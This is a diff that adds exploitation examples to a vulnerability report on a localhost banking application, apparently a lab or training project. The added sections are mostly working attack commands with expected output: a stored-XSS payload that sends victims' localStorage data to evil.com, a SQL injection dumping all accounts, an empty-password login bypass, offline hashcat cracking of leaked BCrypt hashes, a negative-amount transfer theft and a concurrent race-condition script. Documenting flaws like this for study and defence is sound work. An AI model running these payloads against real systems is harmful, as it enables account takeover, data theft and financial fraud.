@@ -93,6 +93,30 @@ More advanced payloads:
 - `<script>document.location='https://evil.com/phish'</script>` - redirect the victim to a phishing page that mimics the bank login.
 - A self-propagating payload that creates a new transfer with the same malicious description from the victim's account, spreading the XSS to additional users (XSS worm pattern).
 
+### Exploitation Example
+
+The attacker creates a transfer whose `description` contains an XSS payload. When the victim views their transactions, the browser executes the script and sends the victim's credentials to the attacker:
+
+```bash
+# Attacker sends a transfer with a malicious description.
+# Replace ATTACKER_ACCT_ID, VICTIM_ACCT_NUM, and ATTACKER_USER_ID with real values.
+
+curl -s -X POST http://localhost:8080/bank/transfer/ATTACKER_USER_ID \
+  -H "Content-Type: application/json" \
+  -d '{
+    "senderAccountId": ATTACKER_ACCT_ID,
+    "recipientAccountNumber": "VICTIM_ACCT_NUM",
+    "amount": 0.01,
+    "description": "<img src=x onerror=\"new Image().src=\x27https://evil.com/steal?d=\x27+encodeURIComponent(localStorage.getItem(\x27user\x27))\">"
+  }'
+
+# When the victim opens their Dashboard or Transactions page:
+# 1. The browser tries to load <img src=x>, which fails.
+# 2. The onerror handler fires, reading localStorage('user') which contains {id, email, name}.
+# 3. It sends that data to https://evil.com/steal via an image request.
+# 4. The attacker now has the victim's userId and can call any API endpoint on their behalf.
+```
+
 ### Security Impact
 
 - **Complete account takeover:** The attacker obtains the victim's userId from localStorage, which grants full access to all API endpoints (read accounts, initiate transfers, delete accounts, view cards including CVV).
@@ -212,6 +236,44 @@ GET /bank/search?name=' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_slee
 ```
 If the response takes 5 seconds, the condition was true. This allows one-bit-at-a-time data extraction.
 
+### Exploitation Example
+
+Dump every account in the database with a single cURL command using a tautology injection (`' OR 1=1 --`):
+
+```bash
+curl -s "http://localhost:8080/bank/search?name=' OR 1=1 --" | jq .
+```
+
+The injected `name` value transforms the SQL query into:
+```sql
+SELECT * FROM accounts WHERE account_name LIKE '%' OR 1=1 --%'
+```
+
+- `'` closes the LIKE string literal.
+- `OR 1=1` makes the WHERE clause always true.
+- `--` comments out the trailing `%'`.
+
+Expected response — every account in the database, including owner password hashes (due to Vuln 4):
+```json
+[
+  {
+    "id": 1,
+    "accountName": "Savings",
+    "accountNumber": "RO49a1b2c3d4e5f6g7h8i9",
+    "currency": "EUR",
+    "balance": 5000.0,
+    "owner": {
+      "id": 1,
+      "fullName": "Emilia Cristea",
+      "email": "emilia@example.com",
+      "password": "$2a$10$xK3v9..."
+    }
+  }
+]
+```
+
+No authentication is required — the endpoint is publicly accessible.
+
 ### Security Impact
 
 - **Full database read access:** The attacker can extract the contents of any table, including `users` (emails, BCrypt hashes), `accounts` (balances, account numbers), `cards` (card numbers, CVVs, expiry dates), and `transfers` (full transaction history).
@@ -309,6 +371,27 @@ The empty-string password bypasses the BCrypt check entirely because the `&&` sh
 3. The server finds the user, evaluates the condition as described above, skips the exception, and returns the full UserResponse with user ID.
 4. Attacker now has the victim's user ID and can access all their data via the unprotected API endpoints.
 
+### Exploitation Example
+
+Log in to any account knowing only the email — send an empty string as the password:
+
+```bash
+curl -s -X POST http://localhost:8080/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "emilia@example.com", "password": ""}'
+```
+
+Expected response (successful login without knowing the real password):
+```json
+{
+  "id": 1,
+  "email": "emilia@example.com",
+  "fullName": "Emilia Cristea"
+}
+```
+
+The attacker now has the victim's `userId` and can call any API endpoint on their behalf (view accounts, cards, transfers, initiate transfers, etc.).
+
 ### Security Impact
 
 - **Complete authentication bypass** for any account whose email is known.
@@ -401,6 +484,32 @@ The Users entity has these fields: `id`, `fullName`, `email`, `password`, `accou
 This data is also exposed via:
 - `GET /bank/search?name=...` (the new search endpoint)
 - `GET /bank/transfers/{userId}` (via `senderAccount.owner`)
+
+### Exploitation Example
+
+Fetch any user's accounts — the response now includes the owner's BCrypt password hash:
+
+```bash
+curl -s http://localhost:8080/bank/accounts/1 | jq '.[0].owner'
+```
+
+Expected response:
+```json
+{
+  "id": 1,
+  "fullName": "Emilia Cristea",
+  "email": "emilia@example.com",
+  "password": "$2a$10$xK3v9RCowEIGqMFnQNcJYOFBs4dONzNm..."
+}
+```
+
+The attacker saves the hash and cracks it offline with a dictionary attack:
+```bash
+# hashcat (GPU-accelerated, BCrypt mode 3200)
+hashcat -m 3200 -a 0 hash.txt rockyou.txt
+```
+
+No authentication is required to call the endpoint, and every API response that returns `Accounts` entities leaks the hash.
 
 ### Security Impact
 
@@ -519,6 +628,30 @@ The transfer logic inverts: the sender gains money and the recipient loses it.
 - No server-side validation exists to catch this - the vulnerability persists even if the frontend were fixed, since the API can be called directly.
 - The backend stores the transaction, creating a record of the theft that could be used for forensic analysis, but there is no real-time detection.
 
+### Exploitation Example
+
+Send a transfer with a negative amount — the sender *gains* money and the recipient *loses* it:
+
+```bash
+# Attacker (userId=2) has Account ID 3 with balance 100 EUR.
+# Victim has account number RO49a1b2c3d4e5f6g7h8i9 with balance 5000 EUR.
+
+curl -s -X POST http://localhost:8080/bank/transfer/2 \
+  -H "Content-Type: application/json" \
+  -d '{
+    "senderAccountId": 3,
+    "recipientAccountNumber": "RO49a1b2c3d4e5f6g7h8i9",
+    "amount": -4000,
+    "description": "Payment"
+  }'
+
+# Response: {"message": "Transfer successful"}
+# Attacker balance: 100 - (-4000) = 4100 EUR  (gained 4000)
+# Victim balance:  5000 + (-4000) = 1000 EUR  (lost 4000)
+```
+
+The backend only checks `balance < amount`; since any positive balance is greater than a negative number, the check always passes.
+
 ---
 
 ## Vulnerability 6 - Code Error: Race Condition (Missing @Transactional)
@@ -612,6 +745,30 @@ With `@Transactional`, the database would lock the rows and the second transacti
 - Violates the fundamental accounting invariant of a banking system.
 - Difficult to detect without transaction-level auditing (the individual transfer records each look valid).
 - Exploitable by any user against their own accounts - no elevated privileges needed.
+
+### Exploitation Example
+
+Fire 20 identical transfer requests simultaneously — multiple pass the balance check before any commit, creating money from nothing:
+
+```bash
+#!/bin/bash
+# Attacker has Account ID 3 (balance: 1000 EUR)
+# Attacker also controls a second account: RO_SECOND_ACCOUNT
+
+URL="http://localhost:8080/bank/transfer/2"
+DATA='{"senderAccountId":3,"recipientAccountNumber":"RO_SECOND_ACCOUNT","amount":1000,"description":"Payment"}'
+
+# Launch 20 concurrent requests (all in background)
+for i in $(seq 1 20); do
+  curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$DATA" &
+done
+wait
+
+# Check balances
+curl -s http://localhost:8080/bank/accounts/2 | jq '.[] | {accountName, balance, currency}'
+```
+
+Expected result: the source account ends at ~0, but the destination account received 1000 EUR multiple times (e.g., 5000 EUR from 5 concurrent successes). Total money in the system increased — the accounting invariant is broken.
 
 ---
 
